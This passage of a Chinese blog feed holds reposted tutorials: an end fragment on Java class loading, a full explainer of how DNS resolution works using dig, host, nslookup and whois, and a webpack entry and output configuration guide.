false);）.或者是调用bootstrap类加载器来加载。</p><p>c.如果父加载器及bootstrap类加载器都没有找到指定的类，那么调用当前类加载器的findClass方法来完成类加载。</p><p>关于自定义类加载器，本篇文章就不介绍了，主要是重写findClass方法，有兴趣的可以参考<a href="http://www.jianshu.com/p/acc7595f1b9d">这篇文章</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS 原理入门</title>
      <link href="/2022/05/15/DNS-%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/"/>
      <url>/2022/05/15/DNS-%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.ruanyifeng.com/blog/2016/06/dns.html">DNS 原理入门</a>(阮一峰)</p><p>DNS 是互联网核心协议之一。不管是上网浏览，还是编程开发，都需要了解一点它的知识。</p><p>本文详细介绍DNS的原理，以及如何运用工具软件观察它的运作。我的目标是，读完此文后，你就能完全理解DNS。</p><h1 id="一、DNS-是什么？"><a href="#一、DNS-是什么？" class="headerlink" title="一、DNS 是什么？"></a>一、DNS 是什么？</h1><p>DNS （Domain Name System 的缩写）的作用非常简单，就是根据域名查出IP地址。你可以把它想象成一本巨大的电话本。</p><p>举例来说，如果你要访问域名<code>math.stackexchange.com</code>，首先要通过DNS查出它的IP地址是<code>151.101.129.69</code>。</p><p>如果你不清楚为什么一定要查出IP地址，才能进行网络通信，建议先阅读我写的<a href="https://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html">《互联网协议入门》</a>。</p><h1 id="二、查询过程"><a href="#二、查询过程" class="headerlink" title="二、查询过程"></a>二、查询过程</h1><p>虽然只需要返回一个IP地址，但是DNS的查询过程非常复杂，分成多个步骤。</p><p>工具软件<code>dig</code>可以显示整个查询过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ dig math.stackexchange.com</span><br></pre></td></tr></table></figure><p>上面的命令会输出六段信息。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3091e7d579178044.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>第一段是查询参数和统计。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e076bf492df460d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>第二段是查询内容<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4845c86df96cadd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面结果表示，查询域名<code>math.stackexchange.com</code>的<code>A</code>记录，<code>A</code>是<code>address</code>的缩写。</p><p>第三段是DNS服务器的答复。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-9024fcd9b4571f8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面结果显示，<code>math.stackexchange.com</code>有四个<code>A</code>记录，即四个<code>IP</code>地址。600是<code>TTL</code>值（Time to live 的缩写），表示缓存时间，即600秒之内不用重新查询。</p><p>第四段显示<code>stackexchange.com</code>的<code>NS</code>记录（Name Server的缩写），即哪些服务器负责管理<code>stackexchange.com</code>的<code>DNS</code>记录。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e9b42cba02ae8eeb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>上面结果显示<code>stackexchange.com</code>共有四条<code>NS</code>记录，即四个域名服务器，向其中任一台查询就能知道<code>math.stackexchange.com</code>的<code>IP</code>地址是什么。</p><p>第五段是上面四个域名服务器的IP地址，这是随着前一段一起返回的。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d6b9bdfafdcd5948.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>第六段是DNS服务器的一些传输信息。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7804063f108a15c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面结果显示，本机的<code>DNS</code>服务器是<code>192.168.1.253</code>，查询端口是53（DNS服务器的默认端口），以及回应长度是305字节。</p><p>如果不想看到这么多内容，可以使用<code>+short</code>参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short math.stackexchange.com</span><br><span class="line"></span><br><span class="line">151.101.129.69</span><br><span class="line">151.101.65.69</span><br><span class="line">151.101.193.69</span><br><span class="line">151.101.1.69</span><br></pre></td></tr></table></figure><p>上面命令只返回<code>math.stackexchange.com</code>对应的4个<code>IP</code>地址（即<code>A</code>记录）。</p><h1 id="三、DNS服务器"><a href="#三、DNS服务器" class="headerlink" title="三、DNS服务器"></a>三、DNS服务器</h1><p>下面我们根据前面这个例子，一步步还原，本机到底怎么得到域名<code>math.stackexchange.com</code>的<code>IP</code>地址。</p><p>首先，本机一定要知道<code>DNS</code>服务器的<code>IP</code>地址，否则上不了网。通过<code>DNS</code>服务器，才能知道某个域名的<code>IP</code>地址到底是什么。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b318de7e4add4e3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><code>DNS</code>服务器的<code>IP</code>地址，有可能是动态的，每次上网时由网关分配，这叫做<code>DHCP</code>机制；也有可能是事先指定的固定地址。Linux系统里面，<code>DNS</code>服务器的<code>IP</code>地址保存在<code>/etc/resolv.conf</code>文件。</p><p>上例的DNS服务器是<code>192.168.1.253</code>，这是一个内网地址。有一些公网的DNS服务器，也可以使用，其中最有名的就是Google的<a href="https://developers.google.com/speed/public-dns/"><code>8.8.8.8</code></a>和Level 3的<a href="https://www.tummy.com/articles/famous-dns-server/"><code>4.2.2.2</code></a>。</p><p>本机只向自己的DNS服务器查询，<code>dig</code>命令有一个<code>@</code>参数，显示向其他DNS服务器查询的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig @4.2.2.2 math.stackexchange.com</span><br></pre></td></tr></table></figure><p>上面命令指定向<code>DNS</code>服务器<code>4.2.2.2</code>查询。</p><h1 id="四、域名的层级"><a href="#四、域名的层级" class="headerlink" title="四、域名的层级"></a>四、域名的层级</h1><p><code>DNS</code>服务器怎么会知道每个域名的<code>IP</code>地址呢？答案是分级查询。</p><p>请仔细看前面的例子，每个域名的尾部都多了一个点。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-c40f927b81c609c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>比如，域名<code>math.stackexchange.com</code>显示为<code>math.stackexchange.com.</code>。这不是疏忽，而是所有域名的尾部，实际上都有一个根域名。</p><p>举例来说，<code>www.example.com</code>真正的域名是<code>www.example.com.root</code>，简写为<code>www.example.com</code>.。因为，根域名<code>.root</code>对于所有域名都是一样的，所以平时是省略的。</p><p>根域名的下一级，叫做”顶级域名”（top-level domain，缩写为TLD），比如<code>.com</code>、<code>.net</code>；再下一级叫做”次级域名”（second-level domain，缩写为SLD），比如<code>www.example.com</code>里面的<code>.example</code>，这一级域名是用户可以注册的；再下一级是主机名（host），比如<code>www.example.com</code>里面的<code>www</code>，又称为”三级域名”，这是用户在自己的域里面为服务器分配的名称，是用户可以任意分配的。</p><p>总结一下，域名的层级结构如下。</p><blockquote><p>主机名.次级域名.顶级域名.根域名</p><p>即</p><p>host.sld.tld.root</p></blockquote><h1 id="五、根域名服务器"><a href="#五、根域名服务器" class="headerlink" title="五、根域名服务器"></a>五、根域名服务器</h1><p>DNS服务器根据域名的层级，进行分级查询。</p><p>需要明确的是，每一级域名都有自己的NS记录，NS记录指向该级域名的域名服务器。这些服务器知道下一级域名的各种记录。</p><p>所谓”分级查询”，就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下。</p><blockquote><ol><li>从”根域名服务器”查到”顶级域名服务器”的NS记录和A记录（IP地址）</li><li>从”顶级域名服务器”查到”次级域名服务器”的NS记录和A记录（IP地址）</li><li>从”次级域名服务器”查出”主机名”的IP地址</li></ol></blockquote><p>仔细看上面的过程，你可能发现了，没有提到DNS服务器怎么知道”根域名服务器”的IP地址。回答是”根域名服务器”的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。</p><p>下面是内置的根域名服务器IP地址的一个<a href="http://www.cyberciti.biz/faq/unix-linux-update-root-hints-data-file/">例子</a>。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-607bc12c401094a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面列表中，列出了根域名（<code>.root</code>）的三条NS记录<code>A.ROOT-SERVERS.NET</code>、<code>B.ROOT-SERVERS.NET</code>和<code>C.ROOT-SERVERS.NET</code>，以及它们的IP地址（即A记录）<code>198.41.0.4</code>、<code>192.228.79.201</code>、<code>192.33.4.12</code>。</p><p>另外，可以看到所有记录的TTL值是3600000秒，相当于1000小时。也就是说，每1000小时才查询一次根域名服务器的列表。</p><p>目前，世界上一共有十三组根域名服务器，从<code>A.ROOT-SERVERS.NET</code>一直到<code>M.ROOT-SERVERS.NET</code>。</p><h1 id="六、分级查询的实例"><a href="#六、分级查询的实例" class="headerlink" title="六、分级查询的实例"></a>六、分级查询的实例</h1><p><code>dig</code>命令的<code>+trace</code>参数可以显示DNS的整个分级查询过程。<br>上面命令的第一段列出根域名<code>.</code>的所有NS记录，即所有根域名服务器。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-89d448ca76c362bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>根据内置的根域名服务器IP地址，DNS服务器向所有这些IP地址发出查询请求，询问<code>math.stackexchange.com</code>的顶级域名服务器<code>com.</code>的NS记录。最先回复的根域名服务器将被缓存，以后只向这台服务器发请求。</p><p>接着是第二段。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-6183772153bcf56c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>上面结果显示<code>.com</code>域名的13条NS记录，同时返回的还有每一条记录对应的IP地址。</p><p>然后，DNS服务器向这些顶级域名服务器发出查询请求，询问<code>math.stackexchange.com</code>的次级域名<code>stackexchange.com</code>的NS记录。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6b1fcea934ac28e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面结果显示<code>stackexchange.com</code>有四条NS记录，同时返回的还有每一条NS记录对应的IP地址。</p><p>然后，DNS服务器向上面这四台NS服务器查询<code>math.stackexchange.com</code>的主机名。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f26ce4bdfbf8e116.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上面结果显示，<code>math.stackexchange.com</code>有4条<code>A</code>记录，即这四个IP地址都可以访问到网站。并且还显示，最先返回结果的NS服务器是<code>ns-463.awsdns-57.com</code>，IP地址为<code>205.251.193.207</code>。</p><h1 id="七、NS-记录的查询"><a href="#七、NS-记录的查询" class="headerlink" title="七、NS 记录的查询"></a>七、NS 记录的查询</h1><p><code>dig</code>命令可以单独查看每一级域名的NS记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig ns com</span><br><span class="line">$ dig ns stackexchange.com</span><br></pre></td></tr></table></figure><p><code>+short</code>参数可以显示简化的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short ns com</span><br><span class="line">$ dig +short ns stackexchange.com</span><br></pre></td></tr></table></figure><h1 id="八、DNS的记录类型"><a href="#八、DNS的记录类型" class="headerlink" title="八、DNS的记录类型"></a>八、DNS的记录类型</h1><p>域名与IP之间的对应关系，称为”记录”（record）。根据使用场景，”记录”可以分成不同的类型（type），前面已经看到了有<code>A</code>记录和<code>NS</code>记录。</p><p>常见的DNS记录类型如下。</p><blockquote><p>（1） A：地址记录（Address），返回域名指向的IP地址。</p><p>（2） NS：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。</p><p>（3）MX：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。</p><p>（4）CNAME：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的跳转，详见下文。</p><p>（5）PTR：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。</p></blockquote><p>一般来说，为了服务的安全可靠，至少应该有两条<code>NS</code>记录，而<code>A</code>记录和<code>MX</code>记录也可以有多条，这样就提供了服务的冗余性，防止出现单点失败。</p><p><code>CNAME</code>记录主要用于域名的内部跳转，为服务器配置提供灵活性，用户感知不到。举例来说，<code>facebook.github.io</code>这个域名就是一个<code>CNAME</code>记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ dig facebook.github.io</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">facebook.github.io. 3370    IN  CNAME   github.map.fastly.net.</span><br><span class="line">github.map.fastly.net.  600 IN  A   103.245.222.133</span><br></pre></td></tr></table></figure><p>上面结果显示，<code>facebook.github.io</code>的<code>CNAME</code>记录指向<code>github.map.fastly.net</code>。也就是说，用户查询<code>facebook.github.io</code>的时候，实际上返回的是<code>github.map.fastly.net</code>的IP地址。这样的好处是，变更服务器IP地址的时候，只要修改<code>github.map.fastly.net</code>这个域名就可以了，用户的<code>facebook.github.io</code>域名不用修改。</p><p>由于CNAME记录就是一个替换，所以域名一旦设置CNAME记录以后，就不能再设置其他记录了（比如<code>A</code>记录和<code>MX</code>记录），这是为了防止产生冲突。举例来说，<code>foo.com</code>指向<code>bar.com</code>，而两个域名各有自己的<code>MX</code>记录，如果两者不一致，就会产生问题。由于顶级域名通常要设置<code>MX</code>记录，所以一般不允许用户对顶级域名设置<code>CNAME</code>记录。</p><p><code>PTR</code>记录用于从<code>IP</code>地址反查域名。<code>dig</code>命令的<code>-x</code>参数用于查询<code>PTR</code>记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dig -x 192.30.252.153</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">153.252.30.192.in-addr.arpa. 3600 IN    PTR pages.github.com.</span><br></pre></td></tr></table></figure><p>上面结果显示，<code>192.30.252.153</code>这台服务器的域名是<code>pages.github.com</code>。</p><p>逆向查询的一个应用，是可以防止垃圾邮件，即验证发送邮件的IP地址，是否真的有它所声称的域名。</p><p><code>dig</code>命令可以查看指定的记录类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ dig a github.com</span><br><span class="line">$ dig ns github.com</span><br><span class="line">$ dig mx github.com</span><br></pre></td></tr></table></figure><h1 id="九、其他DNS工具"><a href="#九、其他DNS工具" class="headerlink" title="九、其他DNS工具"></a>九、其他DNS工具</h1><p>除了<code>dig</code>，还有一些其他小工具也可以使用。</p><p><strong>（1）host 命令</strong></p><p><code>host</code>命令可以看作<code>dig</code>命令的简化版本，返回当前请求域名的各种记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ host github.com</span><br><span class="line"></span><br><span class="line">github.com has address 192.30.252.121</span><br><span class="line">github.com mail is handled by 5 ALT2.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by 10 ALT4.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by 10 ALT3.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by 5 ALT1.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by 1 ASPMX.L.GOOGLE.COM.</span><br><span class="line"></span><br><span class="line">$ host facebook.github.com</span><br><span class="line"></span><br><span class="line">facebook.github.com is an alias for github.map.fastly.net.</span><br><span class="line">github.map.fastly.net has address 103.245.222.133</span><br></pre></td></tr></table></figure><p><code>host</code>命令也可以用于逆向查询，即从<code>IP</code>地址查询域名，等同于<code>dig -x &lt;ip&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ host 192.30.252.153</span><br><span class="line"></span><br><span class="line">153.252.30.192.in-addr.arpa domain name pointer pages.github.com.</span><br></pre></td></tr></table></figure><p><strong>（2）nslookup 命令</strong></p><p><code>nslookup</code>命令用于互动式地查询域名记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup</span><br><span class="line"></span><br><span class="line">&gt; facebook.github.io</span><br><span class="line">Server:     192.168.1.253</span><br><span class="line">Address:    192.168.1.253#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">facebook.github.io  canonical name &#x3D; github.map.fastly.net.</span><br><span class="line">Name:   github.map.fastly.net</span><br><span class="line">Address: 103.245.222.133</span><br><span class="line"></span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure><p><strong>（3）whois 命令</strong></p><p><code>whois</code>命令用来查看域名的注册情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whois github.com</span><br></pre></td></tr></table></figure><h1 id="十、参考链接"><a href="#十、参考链接" class="headerlink" title="十、参考链接"></a>十、参考链接</h1><ul><li><a href="https://www.petekeen.net/dns-the-good-parts">DNS: The Good Parts</a>, by Pete Keen</li><li><a href="http://www.integralist.co.uk/posts/dnsbasics.html">DNS 101</a>, by Mark McDonnell</li></ul><p>（完）</p><h3 id="文档信息"><a href="#文档信息" class="headerlink" title="文档信息"></a>文档信息</h3><ul><li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li><li>发表日期： 2016年6月16日</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack 探索-entry 和output详解</title>
      <link href="/2022/05/03/webpack-%E6%8E%A2%E7%B4%A2-entry-%E5%92%8Coutput%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/05/03/webpack-%E6%8E%A2%E7%B4%A2-entry-%E5%92%8Coutput%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.cnblogs.com/zhaoweikai/p/10944988.html">webpack 探索-entry 和output详解</a></p><p>本文主要讲entry和output相关内容。</p><h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介 "></a>一 简介 </h1><p>entry用来指定Webpack的打包入口。</p><h1 id="二-为什么需要entry？"><a href="#二-为什么需要entry？" class="headerlink" title="二 为什么需要entry？"></a>二 为什么需要entry？</h1><p>这个需要从Webpack打包机制上说明，大家都知道，Webpack的打包的核心原理：一切皆模块。而到底打包那些东西，这些东西之间的依赖关系是什么样的，都源于模块依赖图中的依赖树，而这个树的根节点就是这个entry。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e2404a58a0e1e2e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>上图中入口就是左上角的.js文件。</p><h1 id="三-entry语法"><a href="#三-entry语法" class="headerlink" title="三 entry语法"></a>三 entry语法</h1><p>这部分详细可以参考Webpack官网，这里这是笔者试炼时做的笔记。</p><h4 id="3-1-单入口"><a href="#3-1-单入口" class="headerlink" title="3.1 单入口"></a>3.1 单入口</h4><p>単入口有两种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;use stract&#39;;</span><br><span class="line"></span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    &#x2F;&#x2F; entry: &#39;.&#x2F;src&#x2F;index.js&#39;, &#x2F;&#x2F; 第一种写法</span><br><span class="line">    entry: &#123; &#x2F;&#x2F; 第二种写法</span><br><span class="line">        index : &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &#39;dist&#39;),</span><br><span class="line">        &#x2F;&#x2F; filename: &quot;bundle.js&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    mode: &quot;development&quot;, &#x2F;&#x2F;&quot;production&quot;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意，如果没有配置output的filename，上边构建出来的dist中文件名是index.js。</p><h4 id="3-2-多入口"><a href="#3-2-多入口" class="headerlink" title="3.2 多入口"></a>3.2 多入口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;use stract&#39;;</span><br><span class="line"></span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index : &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">        hello: &#39;.&#x2F;src&#x2F;helloworld.js&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &#39;dist&#39;),</span><br><span class="line">        &#x2F;&#x2F; filename: &quot;bundle.js&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    mode: &quot;development&quot;, &#x2F;&#x2F;&quot;production&quot;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意：上述多入口模式下，打出来的包有两个文件：index.js和hello.js，就是对应entry对象的key。而打包出来的这两个文件，是两个完全独立的包，里边各自包含了Webpack组织包的各种方法，也就是说这两个包是没有任何关系的两个包。</p><h1 id="四-output语法"><a href="#四-output语法" class="headerlink" title="四 output语法"></a>四 output语法</h1><p>output用来告诉Webpack如何将编译后的文件输出到磁盘中。</p><p>在 webpack 中配置 output 属性的最低要求是，将它的值设置为一个对象，包括以下两点：</p><ul><li>filename： 用于输出文件的文件名。</li><li>path：目标输出目录 path 的绝对路径，这个绝对路径指相对于磁盘的（例如：当前工程在D盘，如果设置path为’/dist’，打包的文件将会放在‘D:\dist’目录下），一般情况都使用path.join(__dirname, ‘dist’)方式设置路径，确保工程在任何目录下都能正常放置到当前工程的dist文件夹中。<h4 id="4-1-单入口时output写法"><a href="#4-1-单入口时output写法" class="headerlink" title="4.1 单入口时output写法"></a>4.1 单入口时output写法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#39;use stract&#39;;</span><br><span class="line"></span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">     entry: &#39;.&#x2F;src&#x2F;index.js&#39;, &#x2F;&#x2F; 第一种写法</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &#39;dist&#39;),</span><br><span class="line">        filename: &quot;bundle.js&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    mode: &quot;development&quot;, &#x2F;&#x2F;&quot;production&quot;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>注意：如何filename不设置，打包后的dist目录下，是main.js。即单入口情况下，filename的默认值是‘main.js’。</li></ul><h4 id="4-2-多入口时output写法"><a href="#4-2-多入口时output写法" class="headerlink" title="4.2 多入口时output写法"></a>4.2 多入口时output写法</h4><p>这时filename的值采用占位符写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;use stract&#39;;</span><br><span class="line"></span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    entry: &#123; &#x2F;&#x2F; 第二种写法</span><br><span class="line">        index : &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">        hello: &#39;.&#x2F;src&#x2F;helloworld.js&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &#39;dist&#39;),</span><br><span class="line">        filename: &quot;[name].js&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    mode: &quot;development&quot;, &#x2F;&#x2F;&quot;production&quot;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时，打包出来的dist目录下，有两个文件index.js和hello.js。两个都是独立的文件。</p><p>注意1：上边占位符[name]中name是固定的，不能随意写成其它值。</p><p>注意2：这种多入口设置output方法，实际filename是可以不设置的，不设置情况下打包后dist目录和当前设置时一致的。即多入口情况下，filename的默认值是’[name].js’。</p><h4 id="4-3-CDN-和资源-hash-的复杂用法"><a href="#4-3-CDN-和资源-hash-的复杂用法" class="headerlink" title="4.3  CDN 和资源 hash 的复杂用法"></a>4.3  CDN 和资源 hash 的复杂用法</h4><p>具体参考Webpack官网，目前笔者还没用到，后续用到后再详细分析说明。、</p><p><a href="https://www.webpackjs.com/concepts/output/">https://www.webpackjs.com/concepts/output/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  path: &quot;&#x2F;home&#x2F;proj&#x2F;cdn&#x2F;assets&#x2F;[hash]&quot;,</span><br><span class="line">  publicPath: &quot;http:&#x2F;&#x2F;cdn.example.com&#x2F;assets&#x2F;[hash]&#x2F;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack 中，hash、chunkhash、contenthash 的区别是什么？</title>
      <link href="/2022/05/03/webpack-%E4%B8%AD%EF%BC%8Chash%E3%80%81chunkhash%E3%80%81contenthash-%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2022/05/03/webpack-%E4%B8%AD%EF%BC%8Chash%E3%80%81chunkhash%E3%80%81contenthash-%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
